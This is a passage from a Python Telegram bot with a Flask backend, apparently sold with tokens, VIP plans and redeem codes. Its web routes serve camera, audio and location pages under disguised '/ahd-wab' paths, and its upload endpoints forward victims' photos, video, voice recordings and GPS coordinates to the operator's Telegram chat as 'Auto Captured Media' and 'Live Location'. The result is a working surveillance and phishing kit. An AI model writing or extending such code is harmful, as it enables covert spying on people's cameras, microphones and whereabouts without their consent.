        f"💰 Total Tokens Given: <b>{total * REF_REWARD}</b>",
        f"\n📊 <b>Top 5:</b>"
    ]
    for i, (uid, data) in enumerate(top, 1):
        lines.append(f"{i}. {data.get('name','User')} — <b>{data.get('referral_count',0)} refs</b>")
    lines.append(f"\n{DEV_TAG}")
    bot.send_message(message.chat.id, "<blockquote>" + "\n".join(lines) + "</blockquote>", reply_markup=get_admin_menu())

# --- REDEEM GENERATE ---
@bot.message_handler(func=lambda m: m.text and "Generate redeem" in m.text)
def admin_generate_redeem_start(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>👑 VIP banana chahte hain ya normal?\n{DEV_TAG}</blockquote>", reply_markup=get_redeem_type_menu())

@bot.message_handler(func=lambda m: m.text == "🎫 Normal")
def admin_normal_ask_users(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>🎫 Kitne user ke liye?\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_normal_ask_tokens)

def admin_normal_ask_tokens(message):
    if message.text and "Back to home" in message.text:
        return send_home_dashboard(message.chat.id, message.from_user)
    try:
        users_count = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>💰 Kitne token?\n{DEV_TAG}</blockquote>")
        bot.register_next_step_handler(msg, admin_normal_create_code, users_count)
    except (ValueError, AttributeError):
        bot.send_message(message.chat.id, f"<blockquote>❌ Sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

def admin_normal_create_code(message, users_count):
    try:
        tokens_count = int(message.text.strip())
        code = f"AHD-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        db = load_db()
        db["redeem_codes"][code] = {"type": "token", "value": tokens_count, "uses_left": users_count}
        save_db(db)
        bot.send_message(message.chat.id, (
            f"<blockquote>🎁 <b>Redeem Code Generated</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 Code: <code>{code}</code>\n👥 User : {users_count}\n💰 Token : {tokens_count}\n{DEV_TAG}</blockquote>"
        ), reply_markup=get_admin_menu())
    except (ValueError, AttributeError):
        bot.send_message(message.chat.id, f"<blockquote>❌ Sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "👑 VIP")
def admin_vip_ask_users(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>👑 Kitne user?\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_vip_ask_days)

def admin_vip_ask_days(message):
    if message.text and "Back to home" in message.text:
        return send_home_dashboard(message.chat.id, message.from_user)
    try:
        users_count = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>📅 Kitne din?\n{DEV_TAG}</blockquote>")
        bot.register_next_step_handler(msg, admin_vip_create_code, users_count)
    except (ValueError, AttributeError):
        bot.send_message(message.chat.id, f"<blockquote>❌ Sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

def admin_vip_create_code(message, users_count):
    try:
        days_count = int(message.text.strip())
        code = f"AHD-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        db = load_db()
        db["redeem_codes"][code] = {"type": "unlimited", "days": days_count, "uses_left": users_count}
        save_db(db)
        bot.send_message(message.chat.id, (
            f"<blockquote>👑 <b>VIP Redeem Code</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 Code: <code>{code}</code>\n👥 User : {users_count}\n📅 Days : {days_count}\n💰 Token : unlimited\n{DEV_TAG}</blockquote>"
        ), reply_markup=get_admin_menu())
    except (ValueError, AttributeError):
        bot.send_message(message.chat.id, f"<blockquote>❌ Sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# --- ACTIVATE PLAN INFO ---
@bot.message_handler(func=lambda m: m.text and "⚡ Activate plan" in m.text)
def admin_activate_plan_info(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, (
        f"<blockquote>⚡ <b>Direct Plan Activation:</b>\n\n"
        f"1. <b>Single User VIP:</b>\n<code>/setvip UID DAYS</code>\n(Permanent: 36500)\n\n"
        f"2. <b>Single User Tokens:</b>\n<code>/addtokens UID TOKENS</code>\n\n"
        f"3. <b>All Users VIP:</b>\n<code>/broadcast_vip DAYS</code>\n{DEV_TAG}</blockquote>"
    ), reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text and "📊 User plan" in m.text)
def admin_user_plan_info(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>📊 User se UID lein aur database check karein.\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# --- DIRECT COMMANDS ---
@bot.message_handler(commands=['setvip'])
def set_vip_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        _, target_uid, days = message.text.split()
        db = load_db()
        if target_uid in db["users"]:
            db["users"][target_uid]["plan"] = "unlimited"
            db["users"][target_uid]["expiry"] = (datetime.now() + timedelta(days=int(days))).strftime("%Y-%m-%d %H:%M:%S")
            save_db(db)
            bot.reply_to(message, f"<blockquote>✅ UID <code>{target_uid}</code> ko {days} din ka VIP!\n{DEV_TAG}</blockquote>")
        else:
            bot.reply_to(message, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/setvip UID DAYS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['addtokens'])
def add_tokens_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        _, target_uid, tokens = message.text.split()
        db = load_db()
        if target_uid in db["users"]:
            db["users"][target_uid]["tokens"] = db["users"][target_uid].get("tokens", 0) + int(tokens)
            save_db(db)
            bot.reply_to(message, f"<blockquote>✅ UID <code>{target_uid}</code> me {tokens} tokens!\n{DEV_TAG}</blockquote>")
        else:
            bot.reply_to(message, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/addtokens UID TOKENS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['broadcast_vip'])
def broadcast_vip_cmd(message):
    if not is_admin(message.from_user.id): return
    try:
        _, days = message.text.split()
        days = int(days)
        db = load_db()
        for uid in db["users"]:
            db["users"][uid]["plan"] = "unlimited"
            db["users"][uid]["expiry"] = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        save_db(db)
        bot.reply_to(message, f"<blockquote>🎉 Sabhi Users ko {days} dino ka VIP!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/broadcast_vip DAYS</code>\n{DEV_TAG}</blockquote>")

# --- /refer command ---
@bot.message_handler(commands=['refer'])
def refer_cmd(message):
    handle_refer(message)

@bot.message_handler(commands=['leaderboard'])
def leaderboard_cmd(message):
    handle_leaderboard(message)

# ----------------- 16. FLASK ENDPOINTS -----------------
@app.route('/ahd-wab')
def route_front(): return render_template('Front_camera.html')

@app.route('/ahd-wab-1')
def route_back(): return render_template('Back_camera.html')

@app.route('/ahd-wab-2')
def route_f8s(): return render_template('Front_8s.html')

@app.route('/ahd-wab-3')
def route_b8s(): return render_template('Back_8s.html')

@app.route('/ahd-wab-4')
def route_audio(): return render_template('Audio.html')

@app.route('/ahd-wab-5')
def route_location(): return render_template('Location.html')

@app.route('/upload_media', methods=['POST'])
def receive_media():
    chat_id = request.form.get('chat_id')
    media_type = request.form.get('type')
    file = request.files.get('file')
    if chat_id and file:
        data = file.read()
        caption = f"<blockquote>✅ <b>Auto Captured Media!</b>\n{DEV_TAG}</blockquote>"
        try:
            if media_type == 'photo':
                bot.send_photo(chat_id=chat_id, photo=data, caption=caption)
            elif media_type == 'video':
                bot.send_video(chat_id=chat_id, video=data, caption=caption)
            elif media_type == 'audio':
                bot.send_voice(chat_id=chat_id, voice=data, caption=caption)
            return "OK", 200
        except Exception as e:
            print("Media Send Error:", e)
            return "ERROR", 500
    return "FAIL", 400

@app.route('/upload_location', methods=['POST'])
def receive_location():
    chat_id = request.form.get('chat_id')
    lat = request.form.get('latitude')
    lon = request.form.get('longitude')
    acc = request.form.get('accuracy')
    if chat_id and lat and lon:
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        loc_text = (
            f"<blockquote>📍 <b>Live Location Received!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>Latitude:</b> <code>{lat}</code>\n"
            f"🌐 <b>Longitude:</b> <code>{lon}</code>\n"
            f"🎯 <b>Accuracy:</b> {acc} m\n"
            f"🗺️ <a href='{maps_url}'>Map</a>\n{DEV_TAG}</blockquote>"
        )
        try:
            bot.send_location(chat_id=chat_id, latitude=float(lat), longitude=float(lon))
            bot.send_message(chat_id=chat_id, text=loc_text, disable_web_page_preview=False)
            return "OK", 200
        except Exception as e:
            print("Location Send Error:", e)
            return "ERROR", 500
    return "FAIL", 400

# ----------------- 17. RUN -----------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)).start()
    print(f"🚀 Flask Server port {port} par start...")
    print(f"🔥 Bot polling chalu...")
    bot.infinity_polling(skip_pending=True, timeout=30)
